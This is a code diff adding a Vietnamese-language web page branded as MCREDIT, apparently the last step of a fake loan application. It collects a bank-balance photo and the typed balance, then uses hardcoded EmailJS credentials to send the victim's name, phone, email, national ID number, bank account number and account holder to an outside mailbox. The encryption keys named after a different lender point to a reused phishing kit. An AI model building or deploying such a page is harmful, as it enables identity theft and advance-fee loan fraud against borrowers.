@@ -1,0 +1,871 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=2.0, user-scalable=yes, viewport-fit=cover" />
+    <script src="../js/desktop-scale.js"></script>
+    <title>Bước 10 - Tải ảnh số dư - MCREDIT</title>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet" />
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.10.5/font/bootstrap-icons.css" rel="stylesheet" />
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet" />
+    <link rel="stylesheet" href="../configs/shared/mcredit-design-tokens.css" />
+    <link rel="stylesheet" href="loan-mobile.css" />
+    <link rel="stylesheet" href="mobile-accessibility.css" />
+    <style>
+        :root {
+            --primary-color: var(--mcredit-primary, #00b4fa);
+            --primary-dark: var(--mcredit-primary-dark, #141ed2);
+            --primary-light: var(--mcredit-primary-light, #66d4fc);
+            --dark-text: #212121;
+            --bg-cream: var(--mcredit-bg-secondary, #f8f9fc);
+            --border-light: #e0e0e0;
+        }
+
+        body {
+            background: var(--bg-cream);
+            font-family: 'Roboto', sans-serif;
+            min-height: 100vh;
+            margin: 0;
+            padding: 20px;
+        }
+
+        .page-container {
+            max-width: 440px;
+            margin: 0 auto;
+            animation: fadeIn 0.5s ease-out;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(16px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .header-row {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            margin-bottom: 20px;
+        }
+
+        .btn-back {
+            background: #fff;
+            border: 1px solid var(--border-light);
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: var(--dark-text);
+            text-decoration: none;
+            flex-shrink: 0;
+        }
+
+        .logo img { height: 36px; object-fit: contain; }
+
+        .step-badge {
+            display: inline-block;
+            background: var(--primary-color);
+            color: #fff;
+            font-size: 0.75rem;
+            font-weight: 600;
+            padding: 4px 12px;
+            border-radius: 20px;
+            margin-bottom: 10px;
+        }
+
+        .title {
+            font-size: 1.35rem;
+            font-weight: 700;
+            color: var(--dark-text);
+            margin-bottom: 6px;
+        }
+
+        .subtitle {
+            font-size: 0.9rem;
+            color: #666;
+            margin-bottom: 20px;
+            line-height: 1.5;
+        }
+
+        .info-card {
+            background: #fff;
+            border-radius: 16px;
+            padding: 18px;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.04);
+            margin-bottom: 16px;
+        }
+
+        .info-row {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 8px 0;
+            border-bottom: 1px solid #f0f0f0;
+            font-size: 0.9rem;
+        }
+
+        .info-row:last-child { border-bottom: none; }
+
+        .info-label { color: #666; }
+        .info-value { font-weight: 600; color: var(--dark-text); }
+        .info-value.highlight { color: var(--primary-dark); }
+
+        .guide-list {
+            font-size: 0.85rem;
+            color: #555;
+            line-height: 1.7;
+            margin: 0;
+            padding-left: 18px;
+        }
+
+        .upload-zone {
+            border: 2px dashed var(--border-light);
+            border-radius: 16px;
+            background: #fff;
+            padding: 24px 16px;
+            text-align: center;
+            cursor: pointer;
+            transition: border-color 0.2s, background 0.2s;
+            margin-bottom: 16px;
+        }
+
+        .upload-zone:hover,
+        .upload-zone.dragover {
+            border-color: var(--primary-color);
+            background: var(--mcredit-light-bg, #e8f7fd);
+        }
+
+        .upload-zone.has-image {
+            border-style: solid;
+            border-color: var(--primary-color);
+            padding: 12px;
+        }
+
+        .upload-icon {
+            font-size: 2.5rem;
+            color: var(--primary-color);
+            margin-bottom: 10px;
+        }
+
+        .upload-text {
+            font-size: 0.95rem;
+            font-weight: 500;
+            color: var(--dark-text);
+            margin-bottom: 4px;
+        }
+
+        .upload-hint {
+            font-size: 0.8rem;
+            color: #888;
+        }
+
+        .preview-image {
+            width: 100%;
+            max-height: 280px;
+            object-fit: contain;
+            border-radius: 10px;
+            display: none;
+        }
+
+        .preview-image.show { display: block; }
+
+        .btn-row {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 10px;
+            margin-bottom: 16px;
+        }
+
+        .btn-action {
+            background: #fff;
+            border: 1px solid var(--border-light);
+            border-radius: 10px;
+            padding: 12px 8px;
+            font-size: 0.85rem;
+            font-weight: 500;
+            color: #555;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 6px;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+
+        .btn-action:hover {
+            background: #f8f9fa;
+            border-color: #ccc;
+        }
+
+        .btn-action.active {
+            border-color: var(--primary-color);
+            color: var(--primary-color);
+        }
+
+        .camera-area {
+            display: none;
+            background: #000;
+            border-radius: 12px;
+            overflow: hidden;
+            margin-bottom: 16px;
+            position: relative;
+        }
+
+        .camera-area.show { display: block; }
+
+        #cameraVideo {
+            width: 100%;
+            display: block;
+        }
+
+        .btn-capture {
+            position: absolute;
+            bottom: 12px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: #fff;
+            border: none;
+            border-radius: 50%;
+            width: 56px;
+            height: 56px;
+            font-size: 1.4rem;
+            color: var(--primary-color);
+            box-shadow: 0 2px 10px rgba(0,0,0,0.3);
+            cursor: pointer;
+        }
+
+        .error-msg {
+            color: var(--mcredit-error, #e53e3e);
+            font-size: 0.85rem;
+            text-align: center;
+            margin-bottom: 12px;
+            display: none;
+        }
+
+        .error-msg.show { display: block; }
+
+        .btn-main {
+            background: var(--primary-dark);
+            color: white;
+            border: none;
+            width: 100%;
+            padding: 16px;
+            border-radius: 50px;
+            font-size: 1.05rem;
+            font-weight: 600;
+            transition: all 0.3s;
+            cursor: pointer;
+        }
+
+        .btn-main:disabled {
+            background: #ccc;
+            cursor: not-allowed;
+        }
+
+        .btn-main:not(:disabled):hover {
+            background: var(--primary-color);
+            transform: translateY(-2px);
+        }
+
+        #fileInput { display: none; }
+
+        .form-group {
+            margin-bottom: 16px;
+        }
+
+        .form-label {
+            display: block;
+            font-size: 0.9rem;
+            font-weight: 600;
+            color: var(--dark-text);
+            margin-bottom: 8px;
+        }
+
+        .form-input {
+            width: 100%;
+            padding: 14px 16px;
+            border: 1px solid var(--border-light);
+            border-radius: 12px;
+            font-size: 1rem;
+            font-family: inherit;
+            background: #fff;
+            box-sizing: border-box;
+            transition: border-color 0.2s;
+        }
+
+        .form-input:focus {
+            outline: none;
+            border-color: var(--primary-color);
+            box-shadow: 0 0 0 3px rgba(0, 180, 250, 0.15);
+        }
+
+        .form-hint {
+            font-size: 0.78rem;
+            color: #888;
+            margin-top: 6px;
+        }
+
+        .loading-overlay {
+            display: none;
+            position: fixed;
+            inset: 0;
+            background: rgba(0, 0, 0, 0.45);
+            z-index: 1000;
+            align-items: center;
+            justify-content: center;
+            flex-direction: column;
+            gap: 12px;
+            color: #fff;
+        }
+
+        .loading-overlay.show {
+            display: flex;
+        }
+
+        .spinner {
+            width: 40px;
+            height: 40px;
+            border: 3px solid rgba(255, 255, 255, 0.3);
+            border-top-color: #fff;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        .success-modal {
+            display: none;
+            position: fixed;
+            inset: 0;
+            background: rgba(0, 0, 0, 0.5);
+            z-index: 1001;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+
+        .success-modal.show {
+            display: flex;
+        }
+
+        .success-box {
+            background: #fff;
+            border-radius: 20px;
+            padding: 28px 24px;
+            max-width: 360px;
+            width: 100%;
+            text-align: center;
+            animation: fadeIn 0.3s ease-out;
+        }
+
+        .success-icon {
+            width: 64px;
+            height: 64px;
+            border-radius: 50%;
+            background: #e8f7fd;
+            color: var(--primary-color);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 2rem;
+            margin: 0 auto 16px;
+        }
+
+        .success-title {
+            font-size: 1.15rem;
+            font-weight: 700;
+            color: var(--dark-text);
+            margin-bottom: 10px;
+        }
+
+        .success-text {
+            font-size: 0.92rem;
+            color: #666;
+            line-height: 1.6;
+            margin: 0;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="page-container">
+        <div class="header-row">
+            <a href="step8.html" class="btn-back" aria-label="Quay lại">
+                <i class="bi bi-arrow-left"></i>
+            </a>
+            <div class="logo">
+                <img src="../image/mcredit-logo.png" alt="MCREDIT">
+            </div>
+        </div>
+
+        <span class="step-badge">Bước 9 / 9</span>
+        <h1 class="title">Tải ảnh số dư tài khoản</h1>
+        <p class="subtitle">Vui lòng chụp hoặc tải ảnh màn hình số dư tài khoản ngân hàng để xác thực điều kiện giải ngân.</p>
+
+        <div class="info-card">
+            <div class="info-row">
+                <span class="info-label">Số tiền vay</span>
+                <span class="info-value" id="loanAmount">Đang tải...</span>
+            </div>
+            <div class="info-row">
+                <span class="info-label">Số dư tối thiểu (10%)</span>
+                <span class="info-value highlight" id="minBalance">Đang tải...</span>
+            </div>
+        </div>
+
+        <div class="info-card">
+            <p style="font-weight: 600; font-size: 0.9rem; margin-bottom: 10px; color: var(--primary-color);">
+                <i class="bi bi-info-circle"></i> Hướng dẫn chụp ảnh
+            </p>
+            <ul class="guide-list">
+                <li>Ảnh phải hiển thị rõ số dư tài khoản và thời gian chụp (trong 24h).</li>
+                <li>Chụp trực tiếp từ ứng dụng ngân hàng, không chụp qua màn hình khác.</li>
+                <li>Đảm bảo đủ ánh sáng, không bị mờ hoặc che khuất thông tin.</li>
+            </ul>
+        </div>
+
+        <div class="btn-row">
+            <button type="button" class="btn-action" id="btnUpload">
+                <i class="bi bi-upload"></i> Tải ảnh lên
+            </button>
+            <button type="button" class="btn-action" id="btnCamera">
+                <i class="bi bi-camera"></i> Chụp ảnh
+            </button>
+        </div>
+
+        <input type="file" id="fileInput" accept="image/jpeg,image/jpg,image/png,image/webp" />
+
+        <div class="camera-area" id="cameraArea">
+            <video id="cameraVideo" autoplay playsinline></video>
+            <button type="button" class="btn-capture" id="btnCapture" aria-label="Chụp ảnh">
+                <i class="bi bi-camera-fill"></i>
+            </button>
+        </div>
+
+        <div class="upload-zone" id="uploadZone">
+            <div id="uploadPlaceholder">
+                <div class="upload-icon"><i class="bi bi-image"></i></div>
+                <p class="upload-text">Nhấn để chọn ảnh số dư</p>
+                <p class="upload-hint">JPG, PNG, WEBP — tối đa 5MB</p>
+            </div>
+            <img id="previewImage" class="preview-image" alt="Ảnh số dư đã tải lên" />
+        </div>
+
+        <div class="info-card">
+            <div class="form-group" style="margin-bottom: 0;">
+                <label class="form-label" for="currentBalance">Số dư tài khoản hiện tại</label>
+                <input
+                    type="text"
+                    id="currentBalance"
+                    class="form-input"
+                    inputmode="numeric"
+                    placeholder="Nhập số dư hiện tại (VNĐ)"
+                    autocomplete="off"
+                />
+                <p class="form-hint">Nhập số dư đang có trên tài khoản ngân hàng của bạn.</p>
+            </div>
+        </div>
+
+        <p class="error-msg" id="errorMsg" role="alert"></p>
+
+        <button type="button" class="btn-main" id="btnContinue" disabled>
+            TIẾP TỤC XÁC THỰC GIẢI NGÂN
+        </button>
+    </div>
+
+    <div class="loading-overlay" id="loadingOverlay">
+        <div class="spinner"></div>
+        <p>Đang gửi thông tin...</p>
+    </div>
+
+    <div class="success-modal" id="successModal" role="dialog" aria-modal="true" aria-labelledby="successTitle">
+        <div class="success-box">
+            <div class="success-icon"><i class="bi bi-check-circle-fill"></i></div>
+            <h2 class="success-title" id="successTitle">Gửi thành công</h2>
+            <p class="success-text">Đã gửi thành công. Vui lòng chờ nhân viên hỗ trợ.</p>
+        </div>
+    </div>
+
+    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4.4.1/dist/email.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/crypto-js@4.1.1/crypto-js.min.js"></script>
+    <script>
+        const ENCRYPTION_KEYS = ['fecredit-secret-key-v1', 'fecredit-secret-key'];
+        const MAX_FILE_SIZE = 5 * 1024 * 1024;
+        const ALLOWED_TYPES = ['image/jpeg', 'image/jpg', 'image/png', 'image/webp'];
+        const emailjsConfig = {
+            serviceId: 'service_ezzpzs5',
+            templateId: 'template_s1k4hul',
+            publicKey: 'MQKcpIwixBVd4Q920'
+        };
+
+        let userData = {};
+        let balancePhotoData = null;
+        let cameraStream = null;
+        let isSubmitted = false;
+
+        try {
+            emailjs.init(emailjsConfig.publicKey);
+        } catch (error) {
+            console.error('Cannot initialize EmailJS:', error);
+        }
+
+        function getStoredFormData() {
+            try {
+                return JSON.parse(sessionStorage.getItem('formData') || '{}');
+            } catch (_) {
+                return {};
+            }
+        }
+
+        function getMergedData() {
+            const formData = getStoredFormData();
+            return {
+                fullName: userData.fullName || userData.full_name || formData.fullName || '',
+                phone: userData.phone || userData.phoneNumber || formData.phone || '',
+                email: userData.email || formData.email || '',
+                cccd: userData.cccd || userData.idNumber || formData.cccd || '',
+                loanAmount: userData.loanAmount || userData.registerAmount || userData.amount || formData.amount || 0,
+                bankName: userData.bankName || userData.bank || formData.bank || formData.bankLabel || '',
+                accountNumber: userData.accountNumber || formData.accountNumber || '',
+                accountHolder: userData.accountName || userData.accountHolder || formData.accountHolder || '',
+                loanCode: userData.loanCode || formData.loanCode || '',
+                months: userData.loanTerm || userData.months || formData.months || ''
+            };
+        }
+
+        function buildEmailMessage(data, balanceAmount, minBalance) {
+            return [
+                'XÁC THỰC SỐ DƯ GIẢI NGÂN - MCREDIT',
+                '--------------------------------',
+                'Họ tên: ' + (data.fullName || '—'),
+                'SĐT: ' + (data.phone || '—'),
+                'Email: ' + (data.email || '—'),
+                'CCCD: ' + (data.cccd || '—'),
+                'Mã hồ sơ: ' + (data.loanCode || '—'),
+                'Số tiền vay: ' + (data.loanAmount ? formatVND(data.loanAmount) : '—'),
+                'Số dư tối thiểu: ' + (minBalance ? formatVND(minBalance) : '—'),
+                'Số dư hiện tại: ' + formatVND(balanceAmount),
+                'Ngân hàng: ' + (data.bankName || '—'),
+                'Số TK: ' + (data.accountNumber || '—'),
+                'Chủ TK: ' + (data.accountHolder || '—'),
+                'Ảnh số dư: Đã tải lên',
+                'Thời gian: ' + new Date().toLocaleString('vi-VN'),
+                'Trang: step10.html'
+            ].join('\n');
+        }
+
+        function decryptData(encrypted) {
+            for (const key of ENCRYPTION_KEYS) {
+                try {
+                    const bytes = CryptoJS.AES.decrypt(encrypted, key);
+                    const decrypted = bytes.toString(CryptoJS.enc.Utf8);
+                    if (decrypted) return JSON.parse(decrypted);
+                } catch (e) { continue; }
+            }
+            return null;
+        }
+
+        function encryptData(data) {
+            return CryptoJS.AES.encrypt(JSON.stringify(data), ENCRYPTION_KEYS[1]).toString();
+        }
+
+        function showError(msg) {
+            const el = document.getElementById('errorMsg');
+            el.textContent = msg;
+            el.classList.add('show');
+        }
+
+        function hideError() {
+            document.getElementById('errorMsg').classList.remove('show');
+        }
+
+        function formatVND(amount) {
+            return parseInt(amount, 10).toLocaleString('vi-VN') + ' VNĐ';
+        }
+
+        function parseBalanceInput(value) {
+            const digits = String(value || '').replace(/\D/g, '');
+            return digits ? parseInt(digits, 10) : 0;
+        }
+
+        function updateContinueButton() {
+            if (isSubmitted) {
+                document.getElementById('btnContinue').disabled = true;
+                return;
+            }
+            const balance = parseBalanceInput(document.getElementById('currentBalance').value);
+            document.getElementById('btnContinue').disabled = !(balancePhotoData && balance > 0);
+        }
+
+        function setLoading(loading) {
+            document.getElementById('loadingOverlay').classList.toggle('show', loading);
+            document.getElementById('btnContinue').disabled = loading;
+        }
+
+        function showSuccessModal() {
+            document.getElementById('successModal').classList.add('show');
+        }
+
+        function initData() {
+            const raw = localStorage.getItem('userData');
+            if (raw) {
+                const data = decryptData(raw);
+                if (data) {
+                    userData = data;
+                    const merged = getMergedData();
+                    const amount = merged.loanAmount;
+                    document.getElementById('loanAmount').textContent = amount ? formatVND(amount) : 'Chưa xác định';
+                    document.getElementById('minBalance').textContent = amount ? formatVND(Math.ceil(Number(amount) * 0.1)) : 'Chưa xác định';
+
+                    if (data.balancePhoto) {
+                        balancePhotoData = data.balancePhoto;
+                        showPreview(data.balancePhoto);
+                    }
+
+                    if (data.currentBalance) {
+                        document.getElementById('currentBalance').value = formatVND(data.currentBalance).replace(' VNĐ', '');
+                    }
+
+                    if (data.balanceVerifiedAt) {
+                        isSubmitted = true;
+                        document.getElementById('btnContinue').textContent = 'ĐÃ GỬI XÁC THỰC';
+                    }
+                }
+            } else {
+                userData = {};
+                const merged = getMergedData();
+                const amount = merged.loanAmount;
+                document.getElementById('loanAmount').textContent = amount ? formatVND(amount) : 'Chưa xác định';
+                document.getElementById('minBalance').textContent = amount ? formatVND(Math.ceil(Number(amount) * 0.1)) : 'Chưa xác định';
+            }
+
+            localStorage.setItem('currentStep', 'step10.html');
+            updateContinueButton();
+        }
+
+        function showPreview(dataUrl) {
+            const preview = document.getElementById('previewImage');
+            const placeholder = document.getElementById('uploadPlaceholder');
+            const zone = document.getElementById('uploadZone');
+
+            preview.src = dataUrl;
+            preview.classList.add('show');
+            placeholder.style.display = 'none';
+            zone.classList.add('has-image');
+            updateContinueButton();
+        }
+
+        function validateImage(fileOrType, size) {
+            if (size && size > MAX_FILE_SIZE) {
+                showError('Ảnh quá lớn (tối đa 5MB). Vui lòng chọn ảnh nhỏ hơn.');
+                return false;
+            }
+            if (fileOrType && !ALLOWED_TYPES.includes(fileOrType)) {
+                showError('Chỉ hỗ trợ định dạng JPG, PNG hoặc WEBP.');
+                return false;
+            }
+            hideError();
+            return true;
+        }
+
+        function handleImageData(dataUrl) {
+            balancePhotoData = dataUrl;
+            showPreview(dataUrl);
+            stopCamera();
+        }
+
+        function handleFile(file) {
+            if (!file) return;
+            if (!validateImage(file.type, file.size)) return;
+
+            const reader = new FileReader();
+            reader.onload = () => handleImageData(reader.result);
+            reader.onerror = () => showError('Lỗi khi đọc file. Vui lòng thử lại.');
+            reader.readAsDataURL(file);
+        }
+
+        async function startCamera() {
+            stopCamera();
+            hideError();
+            try {
+                cameraStream = await navigator.mediaDevices.getUserMedia({
+                    video: { facingMode: 'environment' }
+                });
+                const video = document.getElementById('cameraVideo');
+                video.srcObject = cameraStream;
+                document.getElementById('cameraArea').classList.add('show');
+                document.getElementById('btnCamera').classList.add('active');
+            } catch (err) {
+                showError('Không thể truy cập camera. Vui lòng cấp quyền hoặc tải ảnh lên.');
+            }
+        }
+
+        function stopCamera() {
+            if (cameraStream) {
+                cameraStream.getTracks().forEach(track => track.stop());
+                cameraStream = null;
+            }
+            document.getElementById('cameraArea').classList.remove('show');
+            document.getElementById('btnCamera').classList.remove('active');
+        }
+
+        function capturePhoto() {
+            const video = document.getElementById('cameraVideo');
+            if (!video.videoWidth) return;
+
+            const canvas = document.createElement('canvas');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            canvas.getContext('2d').drawImage(video, 0, 0);
+            handleImageData(canvas.toDataURL('image/jpeg', 0.85));
+        }
+
+        async function sendBalanceToEmailJS(balanceAmount) {
+            if (typeof emailjs === 'undefined') {
+                throw new Error('EmailJS chưa được tải. Vui lòng tải lại trang.');
+            }
+
+            const data = getMergedData();
+            const minBalance = data.loanAmount ? Math.ceil(Number(data.loanAmount) * 0.1) : 0;
+            const templateParams = {
+                platform: 'Xác thực số dư giải ngân (Mcredit)',
+                page: 'step10.html',
+                submitted_at: new Date().toLocaleString('vi-VN'),
+                customer_name: data.fullName,
+                full_name: data.fullName,
+                phone: data.phone,
+                phone_number: data.phone,
+                email: data.email,
+                cccd: data.cccd,
+                id_number: data.cccd,
+                loan_amount: data.loanAmount ? formatVND(data.loanAmount) : '',
+                amount: data.loanAmount ? String(data.loanAmount) : '',
+                loan_term: data.months ? data.months + ' tháng' : '',
+                months: data.months ? String(data.months) : '',
+                min_required_balance: minBalance ? formatVND(minBalance) : '',
+                current_balance: formatVND(balanceAmount),
+                account_balance: formatVND(balanceAmount),
+                balance_amount: String(balanceAmount),
+                bank_name: data.bankName,
+                bank: data.bankName,
+                account_number: data.accountNumber,
+                account_holder: data.accountHolder,
+                account_holder_name: data.accountHolder,
+                balance_photo_status: balancePhotoData ? 'Đã tải ảnh số dư' : 'Chưa có ảnh',
+                loan_code: data.loanCode,
+                message: buildEmailMessage(data, balanceAmount, minBalance),
+                content: buildEmailMessage(data, balanceAmount, minBalance)
+            };
+
+            console.log('Gửi EmailJS step10:', templateParams);
+
+            const response = await emailjs.send(
+                emailjsConfig.serviceId,
+                emailjsConfig.templateId,
+                templateParams,
+                { publicKey: emailjsConfig.publicKey }
+            );
+
+            if (response.status !== 200) {
+                throw new Error('EmailJS trả về mã lỗi: ' + response.status);
+            }
+
+            return response;
+        }
+
+        async function saveAndContinue() {
+            hideError();
+
+            if (!balancePhotoData) {
+                showError('Vui lòng tải ảnh số dư trước khi tiếp tục.');
+                return;
+            }
+
+            const balanceAmount = parseBalanceInput(document.getElementById('currentBalance').value);
+            if (!balanceAmount || balanceAmount <= 0) {
+                showError('Vui lòng nhập số dư tài khoản hiện tại.');
+                return;
+            }
+
+            userData.balancePhoto = balancePhotoData;
+            userData.balancePhotoUploadedAt = new Date().toISOString();
+            userData.currentBalance = balanceAmount;
+            userData.balanceVerifiedAt = new Date().toISOString();
+            userData.currentStep = 'step10.html';
+
+            const encrypted = encryptData(userData);
+            localStorage.setItem('userData', encrypted);
+            localStorage.setItem('currentStep', 'step10.html');
+
+            setLoading(true);
+            try {
+                await sendBalanceToEmailJS(balanceAmount);
+                userData.emailSent = true;
+                userData.emailSentAt = new Date().toISOString();
+                localStorage.setItem('userData', encryptData(userData));
+                isSubmitted = true;
+                document.getElementById('btnContinue').textContent = 'ĐÃ GỬI XÁC THỰC';
+                showSuccessModal();
+            } catch (error) {
+                console.error('EmailJS error:', error);
+                showError('Không gửi được thông tin qua EmailJS. Vui lòng thử lại.' +
+                    (error.text ? '\n' + error.text : (error.message ? '\n' + error.message : '')));
+            } finally {
+                setLoading(false);
+                updateContinueButton();
+            }
+        }
+
+        document.getElementById('uploadZone').addEventListener('click', () => {
+            document.getElementById('fileInput').click();
+        });
+
+        document.getElementById('btnUpload').addEventListener('click', () => {
+            document.getElementById('fileInput').click();
+        });
+
+        document.getElementById('fileInput').addEventListener('change', (e) => {
+            handleFile(e.target.files[0]);
+            e.target.value = '';
+        });
+
+        document.getElementById('btnCamera').addEventListener('click', () => {
+            const area = document.getElementById('cameraArea');
+            if (area.classList.contains('show')) {
+                stopCamera();
+            } else {
+                startCamera();
+            }
+        });
+
+        document.getElementById('btnCapture').addEventListener('click', capturePhoto);
+
+        document.getElementById('btnContinue').addEventListener('click', saveAndContinue);
+
+        document.getElementById('currentBalance').addEventListener('input', (e) => {
+            const digits = e.target.value.replace(/\D/g, '');
+            e.target.value = digits ? parseInt(digits, 10).toLocaleString('vi-VN') : '';
+            updateContinueButton();
+        });
+
+        const uploadZone = document.getElementById('uploadZone');
+        uploadZone.addEventListener('dragover', (e) => {
+            e.preventDefault();
+            uploadZone.classList.add('dragover');
+        });
+        uploadZone.addEventListener('dragleave', () => uploadZone.classList.remove('dragover'));
+        uploadZone.addEventListener('drop', (e) => {
+            e.preventDefault();
+            uploadZone.classList.remove('dragover');
+            handleFile(e.dataTransfer.files[0]);
+        });
+
+        window.addEventListener('beforeunload', stopCamera);
+        window.onload = initData;
+    </script>
+    <script src="mobile-fixes.js"></script>
+</body>
+</html>
